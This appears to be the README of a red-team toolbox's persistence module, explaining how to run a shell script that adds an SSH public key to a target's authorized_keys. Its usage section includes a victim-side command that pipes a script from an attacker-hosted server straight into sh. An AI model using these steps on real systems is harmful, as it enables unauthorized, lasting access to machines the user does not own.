# Persistence Phase

Definition...  

Available parts:
- Modify SSH Keys

## Usage

```bash
# From github
curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/persistence/persistence.sh
./persistence.sh -h
```
```bash
# Local network
sudo python -m SimpleHTTPServer 8000 #Host
curl <Host>:8000/persistence.sh | sh #Victim
```

### Parameters
```bash
./persistence.sh -h

Usage: ./persistence.sh [-h] [-s]

-s <SSH public key>
  Trying to add ssh public key to authorized_keys
```

## Results

Results are output directly to the STDOUT.

## Compatibility

The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems. 